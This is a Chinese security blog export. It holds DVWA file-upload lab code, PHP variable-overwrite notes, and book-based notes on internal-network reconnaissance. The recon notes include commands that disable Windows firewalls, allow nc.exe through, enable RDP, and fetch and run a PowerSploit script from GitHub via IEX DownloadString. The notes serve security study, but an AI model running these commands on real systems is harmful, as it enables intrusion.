<h2 id="0x04-3"><a href="#0x04-3" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;	// Where are we going to be writing to?	$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;	$target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] );	// File information	$uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];	$uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ];	$uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];	// Is it an image?	if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;		( $uploaded_size &lt; 100000 ) ) &#123;		// Can we move the file to the upload folder?		if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123;			// No			$html .= &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;		&#125;		else &#123;			// Yes!			$html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;		&#125;	&#125;	else &#123;		// Invalid file		$html .= &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;	&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>strrpos() 函数查找字符串在另一字符串中最后一次出现的位置</p>
<p>strrpos() 函数对大小写敏感</p>
<p>strtolower() 函数把字符串转换为小写</p>
<p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息</p>
<p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度</p>
<h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;	// Where are we going to be writing to?	$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;	$target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] );	// File information	$uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);	$uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];	$uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];	// Is it an image?	if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;		( $uploaded_size &lt; 100000 ) &amp;&amp;		getimagesize( $uploaded_tmp ) ) &#123;		// Can we move the file to the upload folder?		if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;			// No			$html .= &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;		&#125;		else &#123;			// Yes!			$html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;		&#125;	&#125;	else &#123;		// Invalid file		$html .= &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;	&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>待续。。。。firfox有问题</p>
<h2 id="0x06-1"><a href="#0x06-1" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;	// Check Anti-CSRF token	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );	// File information	$uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);	$uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];	$uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ];	$uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];	// Where are we going to be writing to?	$target_path   = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;;	//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;	$target_file   =  md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;	$temp_file     = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) );	$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;	// Is it an image?	if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp;		( $uploaded_size &lt; 100000 ) &amp;&amp;		( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp;		getimagesize( $uploaded_tmp ) ) &#123;		// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)		if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123;			$img = imagecreatefromjpeg( $uploaded_tmp );			imagejpeg( $img, $temp_file, 100);		&#125;		else &#123;			$img = imagecreatefrompng( $uploaded_tmp );			imagepng( $img, $temp_file, 9);		&#125;		imagedestroy( $img );		// Can we move the file to the web root from the temp folder?		if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;			// Yes!			$html .= &quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;		&#125;		else &#123;			// No			$html .= &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;		&#125;		// Delete any temp files		if( file_exists( $temp_file ) )			unlink( $temp_file );	&#125;	else &#123;		// Invalid file		$html .= &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;	&#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</span><br></pre></td></tr></table></figure>



<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h2><h3 id="1-extract"><a href="#1-extract" class="headerlink" title="1.extract()"></a>1.extract()</h3><p>extract() 函数从数组中将变量导入到当前的符号表。</p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
<p>第二个参数 <em>type</em> 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p>
<p>该函数返回成功导入到符号表中的变量数目。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extract(array,extract_rules,prefix)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>array</em></td>
<td>必需。规定要使用的数组。</td>
</tr>
<tr>
<td><em>extract_rules</em></td>
<td>可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。 可能的值：  EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。 <br />EXTR_SKIP - 如果有冲突，不覆盖已有的变量。 <br />EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 <em>prefix</em>。 <br />EXTR_PREFIX_ALL - 给所有变量名加上前缀 <em>prefix</em>。 <br />EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 <em>prefix</em>。 <br />EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。 <br />EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</td>
</tr>
<tr>
<td><em>prefix</em></td>
<td>可选。请注意 <em>prefix</em> 仅在 <em>extract_type</em> 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。 前缀和数组键名之间会自动加上一个下划线。</td>
</tr>
</tbody></table>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>对属性或方法的访问控制，是通过在前面添加关键字 <em>public</em>（公有），<em>protected</em>（受保护）或 <em>private</em>（私有）来实现的。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。</p>
</script></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>域名信息搜集</title>
    <url>/2020/07/24/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p><strong>keyword：我只是互联网的搬运工</strong></p>
<p>PS：这篇文章很长！是前辈ms08067团队出的书《内网安全攻防》里的内容（很不错），我都一一复现了一遍并做了笔记，请耐心观看。以后会有第三章，第四章…的笔记，佛系更新吧~</p>
<p>2.1 内网信息搜集概述<br>当渗透测试人员进入内网后，面对的是一片“黑暗森林”，所以渗透测试人员首先会对当前所处的网络环境进行判断，通常的判断分为三种。</p>
<p>我是谁？——对机器角色的判断。</p>
<p>这是哪？——对目前机器所处网络环境的拓扑结构进行分析和判断。</p>
<p>我在哪？——对目前机器所处位置区域的判断。</p>
<p>2.2 搜集本机信息<br>1：查询网络配置信息<br>获取本机网络配置信息：</p>
<p>ipconfig /all</p>
<span id="more"></span> 


<p>2：查询操作系统及软件的信息<br>（1）查询操作系统和版本信息</p>
<p>英文版系统用这条命令：<br>systeminfo | findstr /B /C:”OS Nmae” /C:”OS Version”</p>
<p>中文版系统用这条命令：<br>systeminfo | findstr /B /C:”OS 名称” /C:”OS 版本”<br>（2）查看系统体系结构</p>
<p>echo %PROCESSOR_ARCHITECTURE%</p>
<p>（3）查看安装的软件及版本、路径等</p>
<p>wmic product get name,version</p>
<p>（4）使用powershell命令，搜集软件的版本信息</p>
<p>powershell “Get-WmiObject -class Win32_Product |Select-Object -Property name,version”</p>
<p>3：查询本机服务信息</p>
<p>wmic service list brief</p>
<p>4：查询进程列表<br>查看当前进程列表和进程用户、分析软件、邮件客户端、vpn和杀毒软件等进程</p>
<p>tasklist</p>
<p>wmic process list brief</p>
<p>5：查看启动程序信息</p>
<p>wmic startup get command,caption</p>
<p>6：查看计划任务</p>
<p>schtasks /query /fo LIST /v</p>
<p>7：查看主机开机时间</p>
<p>net statistics workstation</p>
<p>8：查询用户列表<br>（1）查看有那些用户</p>
<p>net user</p>
<p>（2）获取本地管理员、包含域用户信息</p>
<p>net localgroup administrators</p>
<p>（3）查看当前在线用户</p>
<p>query user || qwinsta</p>
<p>（4）列出或断开本地计算机与所连接的客户端之间的会话</p>
<p>net session<br>（5）查询端口列表</p>
<p>netstat -ano</p>
<p>（6）查询补丁信息</p>
<p>systeminfo</p>
<p>wmic qfe get Caption,Description,HotFixID,InstalledOn</p>
<p>（7）查询本机共享列表</p>
<p>net share</p>
<p>wmic share get name,path,status</p>
<p>9：查询路由表及所有可用接口的ARP缓冲表</p>
<p>route print<br>arp -a</p>
<p>10：查询防火墙相关配置<br>（1）关闭防火墙</p>
<p>win 2003及之前的版本用这条命令：<br>netsh firewall set opmode disable</p>
<p>win 2003之后的版本用这条命令：<br>netsh advfirewall set allprofiles state off<br>（2）查看防火墙配置</p>
<p>netsh firewall show config</p>
<p>（3）修改防火墙配置</p>
<p>win 2003及之前的版本，运行指定程序全部连接：<br>netsh firewall add allowedprogram c:\nc.exe “allow nc” enable</p>
<p>win 2003之后的版本用这条：<br>netsh advfirewall firewall add rule name=”pass nc” dir=in action=allow program=”C:\nc.exe”</p>
<p>允许指定程序连出，命令如下<br>netsh advfirewall firewall add rule name=”Allow nc” dir=out action=allow program=”C: \nc.exe”</p>
<p>允许 3389 端口放行，命令如下<br>netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow</p>
<p>自定义防火墙日志储存位置<br>netsh advfirewall set currentprofile logging filename “C:\windows\temp\fw.log”<br>11：查看代理配置情况</p>
<p>reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings”</p>
<p>12：查询并开启远程连接服务<br>（1）查看远程连接端口<br>在 cmd 下使用注册表查询语句，命令如下，得到连接端口为 0xd3d，转换后为 3389</p>
<p>REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /V PortNumber</p>
<p>（2）在 Windows Server 2003 中开启 3389 端口</p>
<p>wmic path win32_terminalservicesetting where (__CLASS !=””)  call setallowtsconnections 1<br>（3）在Windows Server 2008和Windows Server 2012中开启3389端口</p>
<p>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=””) call setallowtsconnections 1</p>
<p>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=’RDP-Tcp’) call setuserauthenticationrequired 1</p>
<p>reg add “HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f<br>2.2 自动收集信息<br>使用WMIC自动脚本来收集信息,打开运行 wmic_info.bat 会自动生成一个 out.html 文件</p>
<p>Empire下的主机信息搜集<br>Empirer提供了收集主机的模块。</p>
<p>下载地址：<a href="https://github.com/EmpireProject/Empire.git">https://github.com/EmpireProject/Empire.git</a></p>
<p>2.3 查询当前权限<br>1、查看当前权限</p>
<p>whoami<br>本地管理员用户，或者是本地用户：</p>
<p>域内用户：</p>
<p>在以上三种情况下，如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息；而本地管理员用户和域内用户可以查询域内信息。其原理是：域内的所有查询都是通过域控制器实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才拥有这个权限；当域用户执行查询命令时，会自动使用kerberos协议进行认证，无须额外输入账号密码。</p>
<p>2、获取域SID</p>
<p>whoami /all</p>
<p>当前域 hacker 的 SID 为：</p>
<p>3、查询指定用户的详细信息</p>
<p>net user 用户名 /domain</p>
<p>2.4 判断是否存在域<br>1、使用ipconfig命令</p>
<p>ipconfig /all</p>
<p>然后可以使用反向解析查询命令 nslookup 来解析域名的IP地址。用解析到的IP地址进行对比，判断域控制器和DNS服务器是否在同一台服务器上：</p>
<p>nclookup hacker.lab</p>
<p>2、查看系统详细配置<br>使用 systeminfo 命令，如果存在域就会显示：</p>
<p>如果不存在就会显示一个：WORKGROUP</p>
<p>3、查询当前登录域及登录用户信息<br>执行命令如果存在域那么就会显示工作站域和工作站域DNS等信息：</p>
<p>net config workstation</p>
<p>执行命令如果不存在域那么就会显示WORKGROUP：</p>
<p>4、判断主域<br>判断主域：域服务器通常会同时作为时间服务器使用</p>
<p>net time /domain<br>有三种情况，第一种中存在域，当前是域用户：</p>
<p>第二种是，不存在域，环境是工作组：</p>
<p>第三种是，存在域，但是当前用户不是域用户</p>
<p>2.5 探测域内存活主机<br>1、使用nbtscan<br>nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器。</p>
<p>NetBOIS是局域网程序使用的一种程序编程接口（API），为程序提供了请求低级别服务的统一命令集，为局域网提供了网络及其他特殊功能。几乎所有局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的标识名，主要用于局域网中计算机的互访问。NetBIOS的工作流程就是正常的机器名解析查询应答过程，因此推荐优先使用。</p>
<p>使用命令格式：</p>
<p>nbtscan.exe 10.10.10.0/20</p>
<p>第一列为IP地址，第二列为机器名和所在域的名称，第三列是机器所开启的服务列表。</p>
<p>服务列表具体含义：</p>
<p>Token：            含义：<br>SHARING             该机器中存在运行的文件和打印共享服务，但不一定有内容共享<br>DC                 该机器可能是域控制器<br>U=USER             该机器中有登陆名为User的用户（不太准确）<br>IIS                 该机器中可能安装了IIS服务<br>EXCHANGE         该机器中可能安装了Exchane<br>NOTES             该机器中可能安装了Lotus Notes电子邮箱客户端<br>？                 没有识别出机器的NetBIOS资源（可以使用 -F 选项再次扫描）</p>
<p>2、利用ICMP协议快速探测内网<br>除了使用NetBIOS探测内网，还可以使用ICMP协议去探测内网情况。</p>
<p>使用ping命令，依次对内网中的每个IP地址执行Ping命令，可以快速找出内网中所有存活的主机（比较慢）：</p>
<p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr “TTL=”</p>
<p>还可以使用VBS脚本进行探测，脚本源代码如下：</p>
<p>strSubNet = “10.10.10.”<br>Set objFSO= CreateObject(“Scripting.FileSystemObject”)<br>Set objTS = objfso.CreateTextFile(“C:\Windows\Temp\Result.txt”)<br>For i = 1 To 254<br>strComputer = strSubNet &amp; i<br>blnResult = Ping(strComputer)<br>If blnResult = True Then<br>objTS.WriteLine strComputer &amp; “ is alived ! :) “<br>End If<br>Next<br>objTS.Close<br>WScript.Echo “All Ping Scan , All Done ! :) “<br>Function Ping(strComputer)<br>Set objWMIService = GetObject(“winmgmts:\.\root\cimv2”)<br>Set colItems = objWMIService.ExecQuery(“Select * From Win32_PingStatus Where Address=’” &amp; strComputer &amp; “‘“)<br>For Each objItem In colItems<br>Select case objItem.StatusCode<br>Case 0<br>Ping = True<br>Case Else<br>Ping = False<br>End select<br>Exit For<br>Next<br>End Function<br>运行命令：cscript 1.vbs（速度很慢）</p>
<p>运行完后它会把结果保存到C:\Windows\Temp\Result.txt 中：</p>
<p>3、通过ARP扫描探测内网<br>3.1：apr-scan工具<br>把arp-scan工具上传到目标主机上，可以自定义子网掩码，指定扫描范围，命令如下：</p>
<p>arp-scan.exe -t 10.10.10.0/20</p>
<p>3.2:Empire中的arpscan模块<br>下载地址：<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p>
<p>PS：在这里安装Empire需要更改一下格式：<a href="https://jingyan.baidu.com/article/215817f788e8c21eda1423ea.html">https://jingyan.baidu.com/article/215817f788e8c21eda1423ea.html</a></p>
<p>Empire中内置了arpscan的模块，这个模块可以在局域网内发送ARP数据包，搜集活跃主机的IP地址、MAC地址信息。</p>
<p>usemodule situational_awareness/network/arpscan</p>
<p>3.3：Nishang中的Invoke-ARPScan.ps1脚本<br>使用 Nishang 中的 Invoke-ARPScan.ps1 脚本，可以将脚本上传到目标主机执行，也可以直接远程加载执行、自定义掩码和扫描范围，命令如下：</p>
<p>powershell.exe -exec bypass -Command “Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24” &gt;&gt; result.txt</p>
<p>4、通过常规TCP/UDP端口扫描探测内网<br>ScanLine 是一款经典的端口扫描工具，Windows 全版本通用，体积小，仅使用单个文件，同时支持对 TCP/UDP 的端口扫描，命令如下：</p>
<p>scanline.exe -h -t 22,80,110,389,445,3389,1099,1433,3306,3389 -u 53,161,137,139 -O log.txt -p 10.10.10.1-254 /b</p>
<p>2.6 扫描域内端口<br>通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服务的漏洞、分析目标的网络拓扑结构等，具体需要关注以下三点。</p>
<p>端口的 Banner 信息。</p>
<p>端口上运行的服务。</p>
<p>常见应用的默认端口</p>
<p>1：利用Telnet命令进行扫描<br>Telnet协议是TCP/IP协议的一种，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程工作的能力。</p>
<p>在目标主机上使用telnet协议，可以与目标服务器建立连接。如果只是想快速探测某太主机的某个常规高危端口是否开放，使用telnet命令就可以做到！</p>
<p>telnet DC 端口</p>
<p>2：使用S扫描器<br>S 扫描器是早期的一种比较快速的端口扫描工具，特别适合运行在 Windows Sever 2003 以下的平台上，支持大网段扫描。S 扫描器的扫描结果默认保存在其目录下的 result.txt 文件中。推荐使用 TCP 扫描，命令如下：</p>
<p>S.exe TCP 10.10.10.1 10.10.10.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save</p>
<p>3：使用Metasploit端口扫描<br>MSF这里就不多介绍了，我博客 <a href="http://www.saulgoodman.cn/">www.saulGoodman.cn</a> 里面讲了MSF的使用，端口扫描使用这个模块 :</p>
<p>auxiliary/scanner/portscan/tcp：</p>
<p>4：使用PowerScript的Invoke-portscan.ps1脚本<br>以无文件形式扫描，命令如下：</p>
<p>powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan</a> -Hosts 192.168.1.0/24 -T 4 -ports ‘445,1433,8080,3389,80’ -oA c:\windows\temp\res.txt”</p>
<p>使用还是挺不错的，速度挺快。</p>
<p>5：使用Nishang的Invoke-PortScan模块<br>Invoke-PortScan 是 Nishang 的端口扫描脚本，用于发现主机、解析主机名、端口扫描，是一个很实用的脚本。输入“Get-Help Invoke-PortScan -full”命令，即可查看帮助信息</p>
<p>具体的参数介绍如下。<br>StartAddress：扫描范围开始的地址。<br>EndAddress：扫描范围结束的地址。<br>ScanPort：进行端口扫描。<br>Port：指定扫描端口。默认扫描的端口有 21、22、23、53、69、71、80、98、110、139、<br>111、389、443、445、1080、1433、2001、2049、3001、3128、5222、6667、6868、7777、<br>7878、8080、1521、3306、3389、5801、5900、5555、5901。<br>TimeOut：设置超时时间。<br>使用以下命令对本地局域网进行扫描，搜索存活主机并解析主机名：<br>Invoke-PortScan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost</p>
<p>6：端口Bannner信息<br>如果发现了端口，但是不确定这个端口是什么服务，就可以利用一些nc来获取这个端口的banner信息，就好比这样 ：</p>
<p>2.7 搜集域内基础信息<br>确定了当前内网拥有的域，并且所控制的主机在域里面，就可以进行域内相关信息的收集了。</p>
<p>因为这些查询命令本质上都是通过 LDAP 协议去域控制器上查询的，查询时候需要经过权限认证，只有域用户才有这个权限，所以本地用户是无法运行以下命令的（system 权限用户除外。在域里面，除了普通用户，所有机器都有一个机器用户，用户名为机器名加“$”。system 用户对应的就是域里面的机器用户，所以 system 权限用户是可以运行以下查询命令的）。</p>
<p>1：查询域</p>
<p>net view /domain</p>
<p>这里有个坑，有时候查询出错6118错误，是因为 Computer Brower 服务的问题，把它手动启动。</p>
<p>2：查询域内所有计算机<br>执行以下命令就可以查询得到主机名对主机角色进行初步判断：</p>
<p>net view /domain:HACKER[主机名]</p>
<p>3：查询域内所有用户组列表</p>
<p>net group /domain</p>
<p>4：查询所有域成员计算机列表</p>
<p>net group “domain computers” /domain</p>
<p>5：获取域密码信息<br>获取域密码策略、密码长度、错误锁定等信息用这条命令：</p>
<p>net accounts /domain</p>
<p>6：获取域信任信息</p>
<p>nltest /domain_trusts</p>
<p>2.8 查找域控制器<br>1：查看域控制器的机器名</p>
<p>nltest /DCLIST:主机名[Hacker]</p>
<p>2：查看域控制器主机名</p>
<p>Nslookup -type=SRV _ldap._tcp</p>
<p>3：查看当前时间<br>在通常情况下，时间服务器为主域控制器：</p>
<p>net time /domain</p>
<p>4：查看域控制器组</p>
<p>net group “Domain Controllers” /domain</p>
<p>PS：在实际情况中，一个域内一般有两台或者两台以上的域控制器，因为一点主域控制器发生故障，备用域控制器就可以保证域内服务和验证工作正常运行。</p>
<p>执行以下命令查看主域控制器为DC：</p>
<p>netdom query pdc</p>
<p>2.9 获取域内的用户和管理员信息<br>1：查询所有域用户列表<br>1.1：向域控制器进行查询<br>执行以下命令，向域控制器DC查询，域内有5个用户，其中krbtgt用户不仅可以创建票据授权服务（TGS）的加密密钥，还可以实现多种域内权限持久化方法。</p>
<p>net user /domain</p>
<p>1.2：获取域内用户的详细信息<br>执行下面的命令可以获取域内用户的详细信息：用户名、描述信息、SID、域名等等</p>
<p>wmic useraccount get /all</p>
<p>1.3：查看存在的用户<br>执行以下命令会发现有五个用户：</p>
<p>dsquery user</p>
<p>关于 dsquery 命令还有如下：</p>
<p>1.4：查询本地管理员组用户</p>
<p>net localgroup administrators</p>
<p>默认 Domain Admins 组为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。</p>
<p>2：查询域管理员用户组<br>2.1：查询域管理员用户</p>
<p>net group “domain admins” /domain</p>
<p>2.2：查询域管理员用户组</p>
<p>net group “Enterprise Admins” /domain</p>
<p>2.10 定位域管理员<br>1：域管理员定位概述<br>内网渗透测试与常规的渗透测试是截然不同的。内网渗透测试的需求是拿到内网中特定用户或特定机器的权限，进而获得特定资源，完成内网渗透测试任务。</p>
<p>内网渗透测试与常规的渗透测试是截然不同的。内网渗透测试的需求是拿到内网中特定用户或特定机器的权限，进而获得特定资源，完成内网渗透测试任务。在通常的网络环境里，内网中部署了大量的网络安全设备，如 IDS、IPS、日志审计、安全网关、反病毒软件等。所以，在域网络攻击测试场景中，如果渗透测试人员获取了域内的一个支点，为了实现对域网络的整体控制，渗透测试人员就需要获取域管理员权限。</p>
<p>在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员的权限。也就是说，在计算机添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，而且具备完全控制权限。</p>
<p>渗透测试人员通常会通过搜集域内信息，追踪域内特权用户、域管理组用户的历史登录位置、当前登录位置等。定位域内管理员的常规渠道，一是日志，二是会话。日志是指本地机器的管理员日志，可以使用脚本或 wevtutil 导出查看。会话是指域内每个机器的登录会话，可以匿名查询，无须权限，可以使用 netsess.exe 或 PowerView 等工具查询。</p>
<p>2：常用域管理员定位工具<br>2.1：psloggedon.exe<br>使用psloggedon.exe，可以查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户。如果指定的是用户名而不是计算机名，psloggedon.exe会搜索网上邻居中的计算机，并显示该用户当前是否登录。其原理就是通过检查注册表 HKEY_USERS 项的 key 值来查询谁登录过（需要调用NetSessionEnum API），但某些功能需要管理员权限才能使用。</p>
<p>使用语法：<br>-：显示支持的选项和用于输出值的单位。<br>-l：仅显示本地登录，不显示本地和网络资源登录。<br>-x：不显示登录时间。<br>\computername：指定要列出登录信息的计算机的名称。<br>Username：指定用户名，在网络中搜索该用户登录的计算机。</p>
<p>2.2：PVEFindADUser.exe<br>PVEFindADUser.exe这款工具可用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括本地用户、通过RDP登陆的用户、用于运行服务和计划任务的用户。运行该工具的计算机需要配置 .NET Framework 2.0 环境，并且需要具有管理员权限。</p>
<p>使用语法：<br>pveFindADUser.exe &lt;参数&gt;<br>-h：显示帮助。<br>-u：检查是否有更新版本的实用程序。<br>-current [‘’username’’]：如果仅指定了-current 参数，将获取所有目标计算机上当前登录的所有用户。如果指定了用户名（DOMAIN\Username），则显示该用户登录的计算机。<br>-last [‘’username’’]：如果仅指定了-last 参数，将获取目标计算机上的最后一个登录用户。如果指定了用户名（DOMAIN\Username），则显示具有此用户账户作为上次登录的计算机。根据网络的策略，可能会隐藏最后一个登录用户名，且该工具可能无法得到该用户名。 -noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行 ping 命令。<br>-target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机。如果指定此参数，则后跟一个由逗号分隔的主机名列表。</p>
<p>2.3：netview.exe<br>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登陆的用户。同时，netview.exe 能够查询共享入口和有价值的用户。netview.exe的绝大部分功能不需要管理员权限就可以使用。</p>
